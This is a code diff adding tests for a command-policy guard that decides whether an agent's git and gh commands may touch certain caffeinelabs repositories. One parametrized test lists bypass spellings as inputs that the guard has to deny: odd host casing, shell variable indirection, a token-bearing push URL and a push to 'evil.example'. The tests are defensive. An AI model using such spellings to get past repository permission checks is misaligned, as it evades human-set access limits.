@@ -127,6 +127,45 @@ def test_parameters_are_honored() -> None:
     assert infra["result"] == "DENY"  # caffeinelabs/infra is always denied
 
 
+def test_factory_repos_lift_a_project_repo_off_the_default_deny_list() -> None:
+    """The server passes a member's project repos; omnigent then is writable, infra never."""
+    guard = factory_invariants(factory_repos=["caffeinelabs/omnigent"])
+
+    def decide(command: str) -> str:
+        return str(guard(_event(command, _FACTORY_LABELS), {})["result"])
+
+    assert decide("gh pr create -R caffeinelabs/omnigent --fill") == "ALLOW"
+    assert decide("git push https://github.com/caffeinelabs/omnigent factory/d/x") == "ALLOW"
+    assert decide("gh pr create -R caffeinelabs/infra --fill") == "DENY"
+    assert decide("gh pr merge -R caffeinelabs/omnigent 3") == "DENY"
+    assert decide("git push origin staging") == "DENY"
+    # Without them (no factory member, or the factory off) omnigent stays denied.
+    assert _decide("gh pr create -R caffeinelabs/omnigent --fill")["result"] == "DENY"
+    # The admin cannot set them: they are the server's, not a policy parameter.
+    load_registry()
+    unknown = validate_factory_params(HANDLER, {"factory_repos": ["x/y"]}) or ""
+    assert "Unknown params" in unknown
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git push https://x-access-token:abc@GITHUB.COM/caffeinelabs/infra.git factory/d/x",
+        "gh pr create -R GitHub.com/caffeinelabs/infra --fill",
+        "GH_REPO=GITHUB.COM/caffeinelabs/infra gh pr create --fill",
+        "git push https://github.com./caffeinelabs/infra factory/d/x",
+        "gh pr comment https://www.github.com/caffeinelabs/infra/pull/1 -b x",
+        # Targets it cannot read are denied, not assumed harmless.
+        "R=caffeinelabs/infra; gh pr create -R $R --fill",
+        "git push https://evil.example/caffeinelabs/omnigent factory/d/x",
+    ],
+)
+def test_infra_is_denied_however_its_target_is_spelled(command: str) -> None:
+    """Host case, a root dot, www. and shell expansions do not hide infra from the invariant."""
+    guard = factory_invariants(factory_repos=["caffeinelabs/omnigent"])
+    assert guard(_event(command, _FACTORY_LABELS), {})["result"] == "DENY", command
+
+
 def test_registered_with_validated_params() -> None:
     assert "omnigent.policies.builtins.factory_invariants" in BUILTIN_POLICY_MODULES
     load_registry()
